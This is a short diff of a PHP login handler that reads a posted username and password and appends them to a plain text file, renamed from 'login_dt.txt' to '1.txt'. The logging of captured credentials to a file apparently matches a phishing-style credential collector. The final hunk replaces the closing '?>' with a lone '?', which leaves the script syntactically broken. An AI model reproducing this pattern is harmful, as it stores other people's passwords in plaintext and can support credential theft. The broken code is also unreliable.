@@ -3,8 +3,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    // Create or open the file for appending
-    $file = fopen("login_dt.txt", "a");
+    // Open or create the file for writing
+    $file = fopen("1.txt", "a");
 
     // Check if the file was successfully opened
     if ($file) {
@@ -19,4 +19,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Handle invalid request
     echo "Invalid request";
 }
-?>
+?
